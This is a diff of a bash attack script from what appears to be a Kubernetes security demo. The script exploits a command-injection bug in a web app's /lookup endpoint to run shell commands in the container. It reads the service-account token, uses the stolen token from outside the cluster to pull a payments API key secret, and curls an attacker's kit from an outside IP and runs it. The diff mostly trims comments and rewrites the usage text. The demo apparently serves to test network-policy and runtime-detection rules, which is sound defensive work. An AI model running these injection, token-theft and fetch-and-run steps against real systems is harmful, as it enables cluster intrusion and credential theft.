@@ -1,18 +1,5 @@
 #!/usr/bin/env bash
-# The attacker's side of the demo. Every step goes through the command
-# injection bug in the app's /lookup endpoint: traffic the network policy
-# allows.
-#
-#   scripts/attack.sh recon        who and where am I?
-#   scripts/attack.sh token        steal the service-account token
-#   scripts/attack.sh use-token    use the stolen token from outside the cluster
-#   scripts/attack.sh download     download and run the attacker's toolkit with curl
-#   scripts/attack.sh legit        the app's own curl call (must keep working)
-#   scripts/attack.sh bypass       defeat the matchCmdArgs rule with a second URL
-#   scripts/attack.sh tripwire     read the decoy credentials, then download with python
-#   scripts/attack.sh all          recon, token, use-token, download
-#
-# Set SHOW_FULL_TOKEN=1 to print the stolen token in full (shortened by default).
+# The attacker's side of the demo, through the app's command-injection bug.
 set -euo pipefail
 cd "$(dirname "$0")/.."
 export KUBECONFIG=${KUBECONFIG:-/etc/rancher/k3s/k3s.yaml}
@@ -22,9 +9,6 @@ BASE="http://localhost:$PORT"
 INVENTORY="http://inventory.demo.svc.cluster.local:8080"
 TOKEN_PATH=/var/run/secrets/kubernetes.io/serviceaccount/token
 
-# kubectl port-forward gives this script a path to the app, like a public
-# ingress would. If the app pod was restarted, the old port-forward is dead
-# and has to be replaced.
 ensure_port_forward() {
   curl -s --max-time 2 "$BASE/" >/dev/null 2>&1 && return 0
   pkill -f "kubectl.*port-forward.*svc/webapp" 2>/dev/null || true
@@ -48,8 +32,6 @@ shorten_tokens() {
   fi
 }
 
-# Run a shell command inside the app container through the injection bug.
-# The app runs: getent hosts <host>. We send host="localhost; <command>".
 inject() {
   printf '\033[36m$ %s\033[0m\n' "$1"
   curl -sG --max-time 20 --data-urlencode "host=localhost; $1" "$BASE/lookup" \
@@ -66,7 +48,7 @@ recon() {
 
 token() {
   banner "2. Steal the service-account token"
-  # shellcheck disable=SC2016  # $? and $rc are expanded by the remote shell
+  # shellcheck disable=SC2016
   inject "cat $TOKEN_PATH; rc=\$?; echo; echo \"cat_exit=\$rc\""
 }
 
@@ -83,7 +65,6 @@ use_token() {
   ca=$(mktemp)
   kubectl config view --minify --raw -o jsonpath='{.clusters[0].cluster.certificate-authority-data}' | base64 -d > "$ca"
   printf '\033[36m$ kubectl --token=<stolen> -n demo get secret payments-api-key\033[0m\n'
-  # --kubeconfig=/dev/null: use ONLY the stolen token, not your admin credentials.
   kubectl --kubeconfig=/dev/null --server="$server" --certificate-authority="$ca" \
     --token="$tok" -n demo get secret payments-api-key \
     -o jsonpath='{.data.api-key}' | base64 -d; echo
@@ -93,7 +74,6 @@ use_token() {
 download() {
   banner "4. Download and run the attacker's kit"
   local ip; ip=$(attacker_ip)
-  # rm first: a kit.sh left over from an earlier run would hide a successful block.
   inject "rm -f /tmp/kit.sh; curl -s http://$ip/kit.sh -o /tmp/kit.sh; echo curl_exit=\$?; sh /tmp/kit.sh"
 }
 
@@ -126,5 +106,10 @@ case "${1:-all}" in
   bypass) bypass ;;
   tripwire) tripwire ;;
   all) recon; token; use_token; download ;;
-  *) sed -n '2,13p' "$0"; exit 1 ;;
+  *) cat >&2 <<'EOF'
+usage: scripts/attack.sh <recon|token|use-token|download|legit|bypass|tripwire|all>
+  all  recon, token, use-token, download (the default)
+Set SHOW_FULL_TOKEN=1 to print the stolen token in full.
+EOF
+     exit 1 ;;
 esac
